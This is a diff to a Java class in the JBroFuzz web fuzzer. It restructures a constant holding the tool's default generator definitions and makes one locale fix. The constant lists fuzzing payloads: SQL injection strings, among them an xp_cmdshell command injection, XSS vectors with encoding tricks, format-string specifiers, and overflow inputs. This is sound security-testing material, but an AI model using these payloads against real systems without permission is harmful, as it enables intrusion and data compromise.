@@ -97,89 +97,96 @@ public class Format {
    * <p>The list of generators used if a file is not found to load the generators
    * from.</p>
    */
-  public static final String DEFAULT_GENERATORS =
-    "# JBroFuzz Generator Definitions for version 0.3\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
-    "# A bit of (fuzzing) theory \n" + "# -----------------------------------------------------------------------------\n" +
-    "#\n" +
-    "# In the current version, there are two categories of generators. These are:\n" +
-    "# \n" + "# -> Recursive Generators (R)\n" + "#\n" + "# Recursive generators iterate through all combinations of a set alphabet for \n" + "# a given length. An example of this is a HEX generator. This will attempt all \n" + "# possible HEX requests for any given length. For example, if the length was, \n" + "# say, 5 characters then a recursive generator would attempt all combinations \n" +
-    "# from 00000 to fffff.\n" + "#\n" + "# -> Replasive Generators (P)\n" +
-    "#\n" +
-    "# Replasive generators substitute the selected range with the value given \n" +
-    "# from a given value list. An example of this is a XSS generator. This will\n" +
-    "# attempt to check against Cross Site Scripting attacks by substituting a \n" +
-    "# particular part of the request against the given value list. \n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
-    "# What JBroFuzz-0.3 supports (what you change in this file and will work)\n" + "# -----------------------------------------------------------------------------\n" +
-    "#\n" + "# This version supports the alteration/addition of replasive generators as seen \n" +
-    "# below.\n" + "# \n" +
-    "# Next versions will also support adding recursive generators to this file.\n" +
-    "#\n" + "# -----------------------------------------------------------------------------\n" +
-    "# Adding a new generator (yes, you can brake JBroFuzz if you fuzz this file)\n" + "# -----------------------------------------------------------------------------\n" +
-    "#\n" +
-    "# This file is loaded at runtime. To add a replasive generator follow the \n" +
-    "# syntax seen below:\n" + "#\n" + "# P:XXX:(comment < 25 chars):SIZE\n" +
-    "# > Category (essentially a comment field)\n" + "# VALUE(1)\n" +
-    "# VALUE(2)\n" + "# ...\n" + "# VALUE(SIZE)\n" + "#\n" + "# Pre:\n" +
-    "# First line must have 4 fields divided by \":\"\n" +
-    "# First character must be \"P\" for replasive\n" +
-    "# XXX has to be unique and 3 letters long\n" +
-    "# Comment has to be less than 24 characters\n" +
-    "# SIZE has to be between [0-32]\n" +
-    "# SIZE must match the total number of lines below the generator\n" +
-    "# Second line (describing the category) must start with \">\"\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
-    "# Alphabet String Expansion (so that you don't get bored of pasting)\n" + "# -----------------------------------------------------------------------------\n" +
-    "#\n" +
-    "# A value line starting with \"f(x)=\" will be expanded provided it has the \n" +
-    "# character \" x \" between a String and a positive integer. \n" + "#\n" +
-    "# Here is an example:\n" + "#\n" + "# f(x)=A x 100 \n" + "# \n" +
-    "# Will produce a line of 100 A's\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
-    "# What JBroFuzz-0.3 does not support (file changes that will NOT work)\n" + "# -----------------------------------------------------------------------------\n" +
-    "#\n" + "# This version does not support the addition/alteration\n" +
-    "# of recursive generators (starting with R)\n" + "#\n" +
-    "# Copyright (C) 2006 subere (at) uncon org\n" + "# Version 0.3\n" + "#\n" +
-    "\n" + "P:INT:Integer Overflows:12\n" + "> Exploits | Integer values \n" +
-    "-1\n" + "0\n" + "0x100\n" + "0x1000\n" + "0x3fffffff\n" + "0x7ffffffe\n" +
-    "0x7fffffff\n" + "0x80000000\n" + "0xfffffffe\n" + "0xffffffff\n" +
-    "0x10000\n" + "0x100000\n" + "\n" + "P:FSE:Format String Errors:19\n" +
-    "> Exploits | Format String Errors\n" + "%s%p%x%d\n" + ".1024d\n" +
-    "%.2049d\n" + "%p%p%p%p\n" + "%x%x%x%x\n" + "%d%d%d%d\n" + "%s%s%s%s\n" +
-    "%99999999999s\n" + "%08x\n" + "%%20d\n" + "%%20n\n" + "%%20x\n" +
-    "%%20s\n" + "%s%s%s%s%s%s%s%s%s%s\n" + "%p%p%p%p%p%p%p%p%p%p\n" +
-    "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%\n" +
-    "f(x)=%s x 123\n" + "f(x)=%x x 255\n" + "\n" + "P:SQL:SQL Injection:12\n" +
-    "> Database | Injection Attacks\n" + "a'\n" + "?\n" + "' or 1=1\n" +
-    "‘ or 1=1 --\n" + "x' AND userid IS NULL; --\n" +
-    "x' AND email IS NULL; --\n" + "anything' OR 'x'='x\n" +
-    "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n" +
-    "x' AND members.email IS NULL; --\n" + "x' OR full_name LIKE '%Bob%\n" +
-    "23 OR 1=1\n" + "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n" +
-    "\n" + "P:XSS:Cross Site Scripting:12\n" + "> Cross Site Scripting\n" +
-    "<IMG SRC=javascript:alert('XSS')>\n" +
-    "<IMG SRC=JaVaScRiPt:alert('XSS')>\n" +
-    "<IMG SRC=`javascript:alert(\"XSS says, 'XSS'\")`>\n" +
-    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\",\n" +
-    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n" + "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n" + "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n" +
-    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n" +
-    "Perl -e 'print \"<SCR\\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out\n" +
-    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n" +
-    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n" +
-    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n" + "\n" +
-    "R:HEX:Hexadecimal Fuzz Type:16\n" +
-    "> Category String | Characters | Hex\n" + "0\n" + "1\n" + "2\n" + "3\n" +
-    "4\n" + "5\n" + "6\n" + "7\n" + "8\n" + "9\n" + "a\n" + "b\n" + "c\n" +
-    "d\n" + "e\n" + "f\n" + "\n" + "R:DEC:Decimal Fuzz Type:10\n" +
-    "> Category String | Characters | Dec\n" + "0\n" + "1\n" + "2\n" + "3\n" +
-    "4\n" + "5\n" + "6\n" + "7\n" + "8\n" + "9\n" + "\n" +
-    "R:OCT:Octal Fuzz Type:8\n" + "> Category String | Characters | Octal\n" +
-    "0\n" + "1\n" + "2\n" + "3\n" + "4\n" + "5\n" + "6\n" + "7\n" + "\n" +
-    "R:BIN:Binary Fuzz Type:2\n" + "> Category String | Characters | Binary\n" +
-    "0\n" + "1\n" + "\n" + "P:BFO:Buffer Overflows:17\n" +
-    "> Exploits | Buffer overflows\n" + "A\n" + "f(x)=A x 3\n" + "f(x)=A x 5\n" +
-    "f(x)=A x 9\n" + "f(x)=A x 17\n" + "f(x)=A x 33\n" + "f(x)=A x 65\n" +
-    "f(x)=A x 129\n" + "f(x)=A x 257\n" + "f(x)=A x 513\n" + "f(x)=A x 1025\n" +
-    "f(x)=A x 2049\n" + "f(x)=A x 4197\n" + "f(x)=A x 8193\n" +
-    "f(x)=A x 16385\n" + "f(x)=A x 32769\n" + "f(x)=A x 65537\n" + "\n";
-
+  public static final String DEFAULT_GENERATORS;
+  static {
+    DEFAULT_GENERATORS =
+      "# JBroFuzz Generator Definitions for version 0.3\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
+      "# A bit of (fuzzing) theory \n" + "# -----------------------------------------------------------------------------\n" +
+      "#\n" +
+      "# In the current version, there are two categories of generators. These are:\n" +
+      "# \n" + "# -> Recursive Generators (R)\n" + "#\n" + "# Recursive generators iterate through all combinations of a set alphabet for \n" + "# a given length. An example of this is a HEX generator. This will attempt all \n" + "# possible HEX requests for any given length. For example, if the length was, \n" + "# say, 5 characters then a recursive generator would attempt all combinations \n" +
+      "# from 00000 to fffff.\n" + "#\n" + "# -> Replasive Generators (P)\n" +
+      "#\n" +
+      "# Replasive generators substitute the selected range with the value given \n" +
+      "# from a given value list. An example of this is a XSS generator. This will\n" +
+      "# attempt to check against Cross Site Scripting attacks by substituting a \n" +
+      "# particular part of the request against the given value list. \n" +
+      "#\n" + "# -----------------------------------------------------------------------------\n" +
+      "# What JBroFuzz-0.3 supports (what you change in this file and will work)\n" + "# -----------------------------------------------------------------------------\n" +
+      "#\n" + "# This version supports the alteration/addition of replasive generators as seen \n" +
+      "# below.\n" + "# \n" +
+      "# Next versions will also support adding recursive generators to this file.\n" +
+      "#\n" + "# -----------------------------------------------------------------------------\n" +
+      "# Adding a new generator (yes, you can brake JBroFuzz if you fuzz this file)\n" + "# -----------------------------------------------------------------------------\n" +
+      "#\n" +
+      "# This file is loaded at runtime. To add a replasive generator follow the \n" +
+      "# syntax seen below:\n" + "#\n" + "# P:XXX:(comment < 25 chars):SIZE\n" +
+      "# > Category (essentially a comment field)\n" + "# VALUE(1)\n" +
+      "# VALUE(2)\n" + "# ...\n" + "# VALUE(SIZE)\n" + "#\n" + "# Pre:\n" +
+      "# First line must have 4 fields divided by \":\"\n" +
+      "# First character must be \"P\" for replasive\n" +
+      "# XXX has to be unique and 3 letters long\n" +
+      "# Comment has to be less than 24 characters\n" +
+      "# SIZE has to be between [0-32]\n" +
+      "# SIZE must match the total number of lines below the generator\n" +
+      "# Second line (describing the category) must start with \">\"\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
+      "# Alphabet String Expansion (so that you don't get bored of pasting)\n" + "# -----------------------------------------------------------------------------\n" +
+      "#\n" +
+      "# A value line starting with \"f(x)=\" will be expanded provided it has the \n" +
+      "# character \" x \" between a String and a positive integer. \n" + "#\n" +
+      "# Here is an example:\n" + "#\n" + "# f(x)=A x 100 \n" + "# \n" +
+      "# Will produce a line of 100 A's\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
+      "# What JBroFuzz-0.3 does not support (file changes that will NOT work)\n" + "# -----------------------------------------------------------------------------\n" +
+      "#\n" + "# This version does not support the addition/alteration\n" +
+      "# of recursive generators (starting with R)\n" + "#\n" +
+      "# Copyright (C) 2006 subere (at) uncon org\n" + "# Version 0.3\n" +
+      "#\n" +
+      "\n" + "P:INT:Integer Overflows:12\n" + "> Exploits | Integer values \n" +
+      "-1\n" + "0\n" + "0x100\n" + "0x1000\n" + "0x3fffffff\n" + "0x7ffffffe\n" +
+      "0x7fffffff\n" + "0x80000000\n" + "0xfffffffe\n" + "0xffffffff\n" +
+      "0x10000\n" + "0x100000\n" + "\n" + "P:FSE:Format String Errors:19\n" +
+      "> Exploits | Format String Errors\n" + "%s%p%x%d\n" + ".1024d\n" +
+      "%.2049d\n" + "%p%p%p%p\n" + "%x%x%x%x\n" + "%d%d%d%d\n" + "%s%s%s%s\n" +
+      "%99999999999s\n" + "%08x\n" + "%%20d\n" + "%%20n\n" + "%%20x\n" +
+      "%%20s\n" + "%s%s%s%s%s%s%s%s%s%s\n" + "%p%p%p%p%p%p%p%p%p%p\n" +
+      "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%\n" +
+      "f(x)=%s x 123\n" + "f(x)=%x x 255\n" + "\n" + "P:SQL:SQL Injection:12\n" +
+      "> Database | Injection Attacks\n" + "a'\n" + "?\n" + "' or 1=1\n" +
+      "‘ or 1=1 --\n" + "x' AND userid IS NULL; --\n" +
+      "x' AND email IS NULL; --\n" + "anything' OR 'x'='x\n" +
+      "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n" +
+      "x' AND members.email IS NULL; --\n" + "x' OR full_name LIKE '%Bob%\n" +
+      "23 OR 1=1\n" + "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n" +
+      "\n" + "P:XSS:Cross Site Scripting:12\n" + "> Cross Site Scripting\n" +
+      "<IMG SRC=javascript:alert('XSS')>\n" +
+      "<IMG SRC=JaVaScRiPt:alert('XSS')>\n" +
+      "<IMG SRC=`javascript:alert(\"XSS says, 'XSS'\")`>\n" +
+      "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\",\n" +
+      "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n" + "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n" + "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n" +
+      "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n" +
+      "Perl -e 'print \"<SCR\\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out\n" +
+      "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n" +
+      "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n" +
+      "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n" + "\n" +
+      "R:HEX:Hexadecimal Fuzz Type:16\n" +
+      "> Category String | Characters | Hex\n" + "0\n" + "1\n" + "2\n" + "3\n" +
+      "4\n" + "5\n" + "6\n" + "7\n" + "8\n" + "9\n" + "a\n" + "b\n" + "c\n" +
+      "d\n" + "e\n" + "f\n" + "\n" + "R:DEC:Decimal Fuzz Type:10\n" +
+      "> Category String | Characters | Dec\n" + "0\n" + "1\n" + "2\n" + "3\n" +
+      "4\n" + "5\n" + "6\n" + "7\n" + "8\n" + "9\n" + "\n" +
+      "R:OCT:Octal Fuzz Type:8\n" + "> Category String | Characters | Octal\n" +
+      "0\n" + "1\n" + "2\n" + "3\n" + "4\n" + "5\n" + "6\n" + "7\n" + "\n" +
+      "R:BIN:Binary Fuzz Type:2\n" +
+      "> Category String | Characters | Binary\n" +
+      "0\n" + "1\n" + "\n" + "P:BFO:Buffer Overflows:17\n" +
+      "> Exploits | Buffer overflows\n" + "A\n" + "f(x)=A x 3\n" +
+      "f(x)=A x 5\n" +
+      "f(x)=A x 9\n" + "f(x)=A x 17\n" + "f(x)=A x 33\n" + "f(x)=A x 65\n" +
+      "f(x)=A x 129\n" + "f(x)=A x 257\n" + "f(x)=A x 513\n" +
+      "f(x)=A x 1025\n" +
+      "f(x)=A x 2049\n" + "f(x)=A x 4197\n" + "f(x)=A x 8193\n" +
+      "f(x)=A x 16385\n" + "f(x)=A x 32769\n" + "f(x)=A x 65537\n" + "\n";
+  }
   /**
    * <p>Each version of JBroFuzz has a codename, which is defined by this public
    * variable.</p>
@@ -237,7 +244,7 @@ public class Format {
   public static final void setLookAndFeel(JBroFuzz mJBroFuzz) {
     try {
       String os = System.getProperty("os.name");
-      os = os.toLowerCase();
+      os = os.toLowerCase(new Locale(ISO_LAN_CODE));
       if (os.startsWith("windows")) {
         UIManager.setLookAndFeel(
           "com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
